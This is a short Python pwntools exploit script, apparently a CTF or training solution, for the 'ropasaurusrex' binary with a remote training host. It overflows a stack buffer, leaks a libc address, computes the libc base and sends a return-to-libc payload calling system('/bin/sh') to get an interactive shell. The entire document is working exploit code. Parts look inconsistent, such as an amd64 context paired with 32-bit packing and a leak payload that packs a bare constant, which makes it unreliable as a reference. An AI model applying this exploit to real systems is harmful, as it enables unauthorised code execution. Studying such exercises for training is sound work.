from pwn import *
import sys
import time

context.arch = 'amd64'

if(len(sys.argv) > 1):
    if(sys.argv[1] == '--debug'):
        p = process("./ropasaurusrex")
        gdb.attach(p, """
        b *0x0000000000400696
        """ )
        input("wait...")
    elif(sys.argv[1] == '--strace'):
        p = process(["strace", "./ropasaurusrex"])
    elif(sys.argv[1] == '--remote'):
        p = remote("bin.training.offdef.it", 2014)
else:
    p = process("./ropasaurusrex")

libc = ELF("./libc-2.35.so")



payload = b"A" * 140 + p32(4)

p.send(payload)
leak_read = p.recv(4)
read_libc = u32(leak_read)
print("[!] read_libc %#x" % read_libc)
libc_base = read_libc - 0x10a0c0
print("[!] libc_base %#x" % libc_base)
libc.address = libc_base

magic = libc_base + 0x172822
# system = libc_base + 0x0048150
# binsh = libc_base + 0x1bd0f5
system = libc.symbols["system"]
binsh = next(libc.search(b"/bin/sh\x00"))

payload = b"A" * 140 + p32(system) + p32(0) + p32(binsh)
p.send(payload)

p.interactive()
